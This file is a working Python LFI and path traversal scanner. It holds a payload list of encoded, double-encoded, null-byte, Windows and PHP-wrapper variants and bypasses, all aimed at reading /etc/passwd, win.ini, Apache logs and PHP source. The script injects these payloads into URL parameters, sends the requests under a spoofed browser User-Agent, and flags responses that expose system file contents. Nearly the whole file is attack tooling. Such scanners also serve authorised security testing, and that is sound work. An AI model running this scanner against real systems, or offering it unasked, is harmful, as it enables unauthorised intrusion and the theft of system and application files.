import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = [
    # Basic
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # Encoded
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # Double encoding
    "%252e%252e%252fetc%252fpasswd",
    # Windows
    "..\\..\\..\\..\\windows\\win.ini",
    # Null byte
    "../../../../etc/passwd%00",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    # Log files
    "../../../../var/log/apache2/access.log",
    # Bypass
    "....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%c0%af..%c0%afetc/passwd",
]


COMMON_PARAMS = [
    "file", "page", "include", "path",
    "template", "view", "doc", "folder",
]

REQUEST_TIMEOUT = 3

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
})

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

def generate_variants(original, payload):
    return list(dict.fromkeys([
        payload,
        original + payload,
        payload + original,
    ]))

#
def detect_lfi(response):
    text = response.text.lower()
    if "root:x:" in text and "/bin" in text:
        return "Linux passwd file"
    if "[extensions]" in text and "ini" in text:
        return "Windows ini file"
    sample = response.text[:200]
    import re
    if len(response.text) > 200 and re.fullmatch(r'[A-Za-z0-9+/=\n]+', sample):
        return "Base64 encoded file (PHP wrapper)"
    return None

def scan_lfi(url):
    print(f"\n[LFI] Scanning: {url}")
    results = []
    found = set()

    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    existing_params = list(query_params.keys())

    if existing_params:
        all_params = list(dict.fromkeys(existing_params + COMMON_PARAMS))
    else:
        all_params = COMMON_PARAMS[:4]

    for param in all_params:
        original_value = query_params.get(param, [""])[0]

        if any(s in param.lower() for s in ["file", "path", "page", "include"]):
            print(f"  [!] High value parameter: {param}")

        detected = False
        for payload in PAYLOADS:
            variants = generate_variants(original_value, payload)

            for variant in variants:
                key = (param, variant)
                if key in found:
                    continue

                test_url = inject_payload(url, param, variant)
                try:
                    response = session.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
                    detection = detect_lfi(response)

                    if detection:
                        found.add(key)
                        results.append({
                            "url": test_url,
                            "param": param,
                            "payload": variant,
                            "type": "LFI / Path Traversal",
                            "evidence": detection,
                            "confidence": "high"
                        })
                        print(f"  [VULN] LFI → param='{param}' | {detection}")
                        detected = True
                        break

                except requests.exceptions.RequestException:
                    continue

            if detected:
                break

    print(f"  [LFI] Found {len(results)} vulnerability(ies).")
    return results
